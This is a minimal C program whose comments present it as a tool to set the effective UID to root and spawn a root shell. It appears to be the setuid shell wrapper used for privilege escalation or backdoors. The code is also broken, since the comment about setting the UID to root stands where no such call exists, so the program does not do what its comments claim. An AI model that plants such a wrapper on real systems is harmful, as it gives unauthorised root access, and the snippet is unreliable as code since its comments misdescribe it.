#include <unistd.h>
#include <stdlib.h>

int main() {
              // Set effective UID to root
    system("/bin/sh");  // Spawn a root shell
    return 0;
}
